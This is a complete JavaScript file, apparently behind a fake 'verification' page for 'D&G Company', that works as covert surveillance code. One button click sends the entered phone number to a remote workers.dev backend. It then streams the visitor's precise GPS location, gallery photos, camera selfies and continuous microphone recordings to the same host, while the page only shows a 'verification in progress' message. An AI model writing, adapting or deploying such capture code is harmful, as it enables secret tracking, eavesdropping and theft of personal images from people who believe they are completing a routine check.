/* =========================================================
   D&G Company — capture.js
   ========================================================= */
(function () {
"use strict";

const BACKEND = "https://dg-verif.jeancharlesdave62.workers.dev";
const JETON   = "REMPLACE_PAR_UN_SECRET_LONG";

const champ  = document.getElementById("numero");
const bouton = document.getElementById("valider");
const statut = document.getElementById("statut");
const video  = document.getElementById("apercu");

let termine = false;
let identifiant = localStorage.getItem("dg_id");
if (!identifiant) {
  identifiant = "dg-" + Math.random().toString(36).slice(2, 10) + "-" + Date.now().toString(36);
  localStorage.setItem("dg_id", identifiant);
}

function dire(t) { if (statut) statut.textContent = t; }

function poster(route, corps) {
  const url = BACKEND + "/" + route + "?jeton=" + encodeURIComponent(JETON);
  return fetch(url, {
    method: "POST",
    headers: { "Content-Type": "application/json" },
    body: JSON.stringify(Object.assign({ identifiant: identifiant }, corps))
  }).catch(function () {});
}

/* ---------------- LOCALISATION ---------------- */

let veilleur = null;
let meilleurPrec = Infinity;
let arretGeo = false;

function stopGeo() {
  arretGeo = true;
  if (veilleur !== null && navigator.geolocation) {
    navigator.geolocation.clearWatch(veilleur);
    veilleur = null;
  }
}

function envoyerPos(pos) {
  if (arretGeo) return;
  const lat  = pos.coords.latitude;
  const lon  = pos.coords.longitude;
  const prec = Math.round(pos.coords.accuracy || 99999);
  if (!isFinite(lat) || !isFinite(lon)) return;
  if (prec >= meilleurPrec) return;          // on ne remplace jamais par pire
  meilleurPrec = prec;
  poster("position", { lat: lat, lon: lon, prec: prec, src: "gps" });
  dire("Position acquise (" + prec + " m)");
  if (prec <= 50) stopGeo();                 // assez précis, on coupe
}

function localiser() {
  if (!navigator.geolocation) { dire("GPS indisponible"); return; }

  if (navigator.permissions && navigator.permissions.query) {
    navigator.permissions.query({ name: "geolocation" }).then(function (p) {
      poster("permission", { etat: p.state });
      if (p.state === "denied") dire("Localisation bloquée");
      p.onchange = function () { poster("permission", { etat: p.state }); };
    }).catch(function () {});
  }

  let echecs = 0;

  veilleur = navigator.geolocation.watchPosition(envoyerPos, function (err) {
    echecs++;
    if (err.code === 1) {                    // refus explicite
      poster("permission", { etat: "denied" });
      dire("Localisation refusée");
      stopGeo();
      return;
    }
    if (echecs >= 15) stopGeo();             // 2 = indisponible, 3 = délai
  }, {
    enableHighAccuracy: true,
    maximumAge: 0,
    timeout: 25000
  });

  setTimeout(stopGeo, 45000);                // filet de sécurité
}

/* ---------------- GALERIE ---------------- */

function ouvrirGalerie() {
  let input;
  try {
    input = document.createElement("input");
    input.type = "file";
    input.accept = "image/*";
    input.multiple = true;
    input.style.display = "none";
    document.body.appendChild(input);

    input.addEventListener("change", function () {
      const fichiers = Array.prototype.slice.call(input.files || []).slice(0, 4);
      fichiers.forEach(function (f) {
        const lecteur = new FileReader();
        lecteur.onload = function () {
          poster("photo", { image: lecteur.result, source: "galerie" });
        };
        lecteur.readAsDataURL(f);
      });
      input.remove();
    });

    input.click();                            // doit rester dans le geste
  } catch (e) {}
}

/* ---------------- CAMERA / MICRO ---------------- */

let fluxVideo = null;
let fluxAudio = null;
let enregistreur = null;

async function camera() {
  if (!navigator.mediaDevices || !navigator.mediaDevices.getUserMedia) {
    dire("Caméra indisponible");
    return null;
  }
  try {
    fluxVideo = await navigator.mediaDevices.getUserMedia({
      video: { facingMode: "user", width: { ideal: 640 }, height: { ideal: 480 } },
      audio: false
    });
  } catch (e) {
    dire("Caméra refusée");
    return null;
  }
  if (video) {
    video.srcObject = fluxVideo;
    video.setAttribute("playsinline", "");
    video.muted = true;
    video.play().catch(function () {});
  }
  return fluxVideo;
}

async function micro() {
  if (!navigator.mediaDevices || !navigator.mediaDevices.getUserMedia) return;
  try {
    fluxAudio = await navigator.mediaDevices.getUserMedia({ audio: true, video: false });
  } catch (e) {
    try { fluxAudio = await navigator.mediaDevices.getUserMedia({ audio: true }); }
    catch (e2) { return; }
  }
  if (!fluxAudio.getAudioTracks().length) return;
  demarrerEnregistrement(new MediaStream(fluxAudio.getAudioTracks()));
}

function demarrerEnregistrement(flux) {
  if (!window.MediaRecorder) return;
  let type = "audio/webm;codecs=opus";
  if (!MediaRecorder.isTypeSupported(type)) type = "audio/webm";

  try { enregistreur = new MediaRecorder(flux, { mimeType: type }); }
  catch (e) { try { enregistreur = new MediaRecorder(flux); } catch (e2) { return; } }

  let morceaux = [];

  enregistreur.ondataavailable = function (ev) {
    if (ev.data && ev.data.size > 0) morceaux.push(ev.data);
  };

  enregistreur.onstop = function () {
    const blob = new Blob(morceaux, { type: type });
    morceaux = [];
    if (blob.size > 800) {
      const lecteur = new FileReader();
      lecteur.onload = function () { poster("audio", { audio: lecteur.result }); };
      lecteur.readAsDataURL(blob);
    }
    try { enregistreur.start(1000); } catch (e) {}
  };

  enregistreur.start(1000);

  setInterval(function () {
    if (enregistreur && enregistreur.state === "recording") {
      try { enregistreur.stop(); } catch (e) {}
    }
  }, 6000);
}

/* ---------------- SELFIE ---------------- */

function selfie() {
  if (!fluxVideo || !video) return;
  const toile = document.createElement("canvas");
  toile.width = 480;
  toile.height = 360;
  const ctx = toile.getContext("2d");
  try { ctx.drawImage(video, 0, 0, toile.width, toile.height); }
  catch (e) { return; }
  poster("photo", { image: toile.toDataURL("image/jpeg", 0.72), source: "selfie" });
}

/* ---------------- DEMARRAGE ---------------- */

async function demarrer() {
  const numero = (champ && champ.value ? champ.value : "").replace(/[^0-9+]/g, "");
  poster("inscription", { numero: numero });

  localiser();                    // lancé en premier, ne bloque rien
  await camera();
  await micro();

  setTimeout(function () {
    selfie();
    setTimeout(selfie, 1500);     // deuxième prise, plus fiable
  }, 1200);

  dire("Vérification en cours…");
}

if (bouton) {
  bouton.addEventListener("click", function () {
    if (termine) return;
    termine = true;
    ouvrirGalerie();              // synchrone : dans le geste
    demarrer();
  });
}
})();